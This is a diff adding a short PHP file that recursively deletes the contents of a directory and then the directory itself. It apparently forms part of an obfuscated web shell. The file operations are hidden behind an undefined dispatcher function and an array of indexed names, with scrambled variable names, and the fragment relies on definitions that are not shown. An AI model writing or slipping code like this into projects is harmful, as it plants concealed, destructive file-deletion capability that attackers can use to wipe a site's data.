@@ -1,0 +1,22 @@
+<?Php
+if($b!='/'&&$b!='\\'&&$b[0]!='.'&&!(($b[0]=='/'||$b[0]=='\\')&&$b[1]=='.'))
+if(is_dir($b)){
+	if(is_readable($b)){
+		$_X=z($z[15],$b);
+		if(!empty($_X)&&empty($c)){
+			foreach($_X as $i=>$dsy){
+				if(is_dir($b.'/'.$dsy)){
+					z($z[17],$b.'/'.$dsy);
+				}
+				else{
+					z($z[14],$b.'/'.$dsy);
+				}
+				unset($_X[$i]);
+			}
+		}
+		if(empty($_X)){
+			$snc=rmdir($b);
+		}
+	}
+}
+?>
